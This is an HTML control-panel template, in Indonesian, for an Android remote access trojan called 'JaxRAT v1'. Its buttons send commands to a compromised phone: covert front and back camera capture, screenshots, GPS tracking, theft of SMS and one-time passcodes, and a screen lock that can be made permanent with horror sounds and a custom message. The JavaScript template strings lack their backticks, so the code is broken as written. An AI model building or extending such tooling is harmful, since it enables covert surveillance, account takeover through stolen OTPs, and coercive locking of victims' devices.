<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JaxRAT v1 - Kontrol</title>
    <style>
        body { background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .header { display: flex; justify-content: space-between; border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; }
        .btn { background-color: #000; color: #00ff00; border: 2px solid #00ff00; padding: 10px; margin: 5px 0; font-family: inherit; cursor: pointer; transition: 0.3s; border-radius: 5px; font-size: 14px; width: 100%;}
        .btn:hover { background-color: #00ff00; color: #000; }
        .btn-panic { color: #ff0000; border-color: #ff0000; font-weight: bold; font-size: 18px; padding: 15px;}
        .btn-panic:hover { background-color: #ff0000; color: #000; box-shadow: 0 0 20px #ff0000; }
        
        .grid-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .card { border: 1px solid #00ff00; padding: 15px; background: #050505; border-radius: 5px; }
        h3 { margin-top: 0; border-bottom: 1px dashed #00ff00; padding-bottom: 5px; font-size: 16px;}
        
        input[type="text"], select { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; width: 100%; margin-bottom: 10px; font-family: inherit; box-sizing: border-box;}
        label { font-size: 13px; display: block; margin-top: 5px;}
        
        .status { margin-top: 15px; padding: 10px; border: 1px solid #00ff00; background: #001100; margin-bottom: 20px;}
    </style>
</head>
<body>
    <div class="header">
        <h1>[ KONTROL: {{ device.name }} ]</h1>
        <a href="/" class="btn" style="width: auto; padding: 10px 20px;">← Kembali</a>
    </div>

    <button class="btn btn-panic" onclick="kirimPerintah('STOP_ALL')">🚨 HENTIKAN SEMUA FITUR (PANIC) 🚨</button>
    
    <div class="status" id="status-box">Menunggu perintah...</div>

    <div class="grid-container">
        <!-- 1. KARTU SENTER -->
        <div class="card">
            <h3>🔦 Senter</h3>
            <button class="btn" onclick="kirimPerintah('flash_on')">NYALA</button>
            <button class="btn" onclick="kirimPerintah('flash_off')">MATI</button>
            <button class="btn" onclick="kirimPerintah('flash_strobe')">Kelap-Kelip</button>
        </div>

        <!-- 2. KARTU KUNCI LAYAR BIASA -->
        <div class="card">
            <h3>📴 Kunci Layar (Device)</h3>
            <p style="font-size: 12px; color: #888;">Mematikan layar HP sepenuhnya.</p>
            <button class="btn" onclick="kirimPerintah('lock_device')">Kunci Layar HP</button>
            <button class="btn" style="color:red; border-color:red;" onclick="kirimPerintah('unlock_device')">Buka Kunci HP</button>
        </div>

        <!-- 3. KARTU SCREEN PINNING (SEMATAN CUSTOM) -->
        <div class="card" style="grid-column: span 2;">
            <h3>📌 Screen Pinning (Kunci Aplikasi/Layar Custom)</h3>
            <p style="font-size: 12px; color: #888;">Mengunci layar dengan tampilan khusus.</p>
            
            <div style="display: flex; gap: 10px;">
                <div style="flex: 1;">
                    <label>Durasi:</label>
                    <select id="timer_pin">
                        <option value="60">1 Menit</option>
                        <option value="3600">1 Jam</option>
                        <option value="86400">1 Hari</option>
                        <option value="2592000">1 Bulan</option>
                        <option value="0">Permanen</option>
                    </select>
                </div>
                <div style="flex: 1;">
                    <label>Efek Suara:</label>
                    <select id="suara_pin">
                        <option value="none">Tanpa Suara</option>
                        <option value="horor">Suara Horor Bawaan</option>
                        <option value="custom">Suara Horor Custom (Upload)</option>
                    </select>
                </div>
            </div>

            <label>Pesan di atas Sandi:</label>
            <input type="text" id="pesan_pin" placeholder="Contoh: Jangan main HP dulu ya nak...">
            
            <div style="display: flex; gap: 20px; margin-bottom: 10px;">
                <label><input type="checkbox" id="getar_pin" checked> Getaran Custom</label>
                <label><input type="checkbox" id="volume_pin"> Volume Maksimal</label>
            </div>

            <button class="btn" onclick="kirimScreenPin()">Kunci & Sematkan Sekarang</button>
            <button class="btn" style="color:red; border-color:red;" onclick="kirimPerintah('unpin_screen')">Lepas Sematan</button>
        </div>

        <!-- 4. KARTU PESAN POP-UP -->
        <div class="card">
            <h3>💬 Pesan Pop-up</h3>
            <input type="text" id="pesan_popup" placeholder="Ketik pesan...">
            <button class="btn" onclick="kirimPopup()">Kirim ke Layar HP</button>
        </div>

        <!-- 5. KARTU DATA & SPY -->
        <div class="card">
            <h3>🕵️ Data & Spy</h3>
            <button class="btn" onclick="kirimPerintah('screenshot')">Screenshot</button>
            <button class="btn" onclick="kirimPerintah('camera_front')">Kamera Depan</button>
            <button class="btn" onclick="kirimPerintah('camera_back')">Kamera Belakang</button>
            <button class="btn" onclick="kirimPerintah('get_gps')">Lacak GPS</button>
            <button class="btn" onclick="kirimPerintah('get_sms')">Ambil SMS</button>
            <button class="btn" onclick="kirimPerintah('get_otp')">Ambil OTP</button>
        </div>
    </div>

    <script>
        const deviceId = "{{ device_id }}";
        
        function kirimPerintah(cmd) {
            fetch(/api/command/${deviceId}, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: cmd })
            }).then(response => response.json()).then(data => {
                document.getElementById('status-box').innerText = "✅ Perintah Terkirim: " + cmd;
            });
        }

        // Fungsi Pesan Pop-up
        function kirimPopup() {
            const psn = document.getElementById('pesan_popup').value;
            if(!psn) return alert("Pesan kosong!");
            kirimPerintah('msg|' + psn);
        }

        // Fungsi Screen Pinning (Custom)
        function kirimScreenPin() {
            const timer = document.getElementById('timer_pin').value;
            const suara = document.getElementById('suara_pin').value;
            const pesan = document.getElementById('pesan_pin').value || "-";
            const getar = document.getElementById('getar_pin').checked ? "1" : "0";
            const volume = document.getElementById('volume_pin').checked ? "1" : "0";
            
            // Format perintah: pin|timer|suara|getar|volume|pesan
            const cmd = pin|${timer}|${suara}|${getar}|${volume}|${pesan};
            kirimPerintah(cmd);
        }
    </script>
</body>
</html>
